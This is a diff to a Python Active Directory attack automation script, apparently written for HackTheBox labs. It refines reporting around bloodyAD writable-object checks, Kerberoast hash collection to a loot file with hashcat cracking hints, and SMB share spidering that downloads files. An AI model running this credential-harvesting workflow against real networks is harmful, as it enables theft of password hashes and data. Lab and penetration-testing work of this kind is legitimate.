@@ -323,7 +323,8 @@ def _bloodyad_writable(
                "get", "writable", "--otype", otype]
         findings.cmd(" ".join(cmd))
         out = runner.run(cmd, f"creds_bloodyad_{label_suffix}", timeout=60)
-        findings.code_block(_trim(out, lines=30))
+        if out.strip():
+            findings.code_block(_trim(out, lines=30))
         found = _parse_writable(out, otype)
         # For users: exclude machine accounts; for computers: include (they end in $)
         if otype != "COMPUTER":
@@ -335,6 +336,7 @@ def _bloodyad_writable(
             if otype == "USER":
                 all_targets.extend(found)
         else:
+            findings.note(f"No writable {otype.lower()} objects found")
             print(f"        [-] No writable {otype.lower()} objects")
 
     return all_targets
@@ -749,11 +751,16 @@ def _ad_core(
         findings.cmd(" ".join(cmd))
         out = runner.run(cmd, "creds_getuserspns", timeout=60)
         hashes = [line for line in out.splitlines() if "$krb5tgs$" in line]
+        # Extract account names from the SPN table (lines with SPN column data)
+        spn_accounts = re.findall(
+            r"^certified\.htb/\S+\s+(\S+)\s", out, re.MULTILINE | re.IGNORECASE
+        ) or re.findall(r"^\S+/\S+\s+(\S+)\s", out, re.MULTILINE)
         if hashes:
             added = ws.append_hash_file("kerberoast.hash", hashes)
-            findings.bullet(f"**{len(hashes)} Kerberoastable hashes** ({added} new) → `loot/kerberoast.hash`")
-            findings.add_summary(f"{len(hashes)} Kerberoastable accounts — crack with hashcat -m 13100")
-            print(f"    [+] {len(hashes)} Kerberoastable hashes ({added} new)")
+            acct_str = f" — account(s): {', '.join(f'`{a}`' for a in spn_accounts)}" if spn_accounts else ""
+            findings.bullet(f"**{len(hashes)} Kerberoastable hashes** ({added} new) → `loot/kerberoast.hash`{acct_str}")
+            findings.add_summary(f"{len(hashes)} Kerberoastable: {', '.join(spn_accounts) or 'unknown'} — crack with hashcat -m 13100")
+            print(f"    [+] {len(hashes)} Kerberoastable hashes ({added} new){' — ' + ', '.join(spn_accounts) if spn_accounts else ''}")
             print(f"        → loot/kerberoast.hash  [hashcat -m 13100]")
         else:
             if "error" in out.lower():
@@ -1008,9 +1015,13 @@ def _smb_spider(
     ]
     findings.cmd(f"nxc smb {ip} -u {user} -p *** -M spider_plus -o DOWNLOAD_FLAG=True OUTPUT_FOLDER=loot/creds_smb/{user}/")
     runner.run(cmd, f"creds_smb_spider_{user}", timeout=180)
-    files = [f for f in smb_loot.rglob("*") if f.is_file()]
+    # Exclude spider_plus metadata JSON (IP-named file) from file listing
+    files = [f for f in smb_loot.rglob("*") if f.is_file() and not re.match(r"\d+\.\d+\.\d+\.\d+\.json", f.name)]
     if files:
-        findings.bullet(f"**{len(files)} files downloaded** → `loot/creds_smb/{user}/`")
+        findings.bullet(f"**{len(files)} SMB files downloaded** → `loot/creds_smb/{user}/`")
+        for f in sorted(files):
+            rel = f.relative_to(smb_loot)
+            findings.bullet(f"  `{rel}` ({f.stat().st_size} B)")
         findings.add_summary(f"SMB files downloaded for {user}: {len(files)} files in loot/creds_smb/{user}/")
         print(f"        [+] {len(files)} SMB files downloaded → loot/creds_smb/{user}/")
     else:
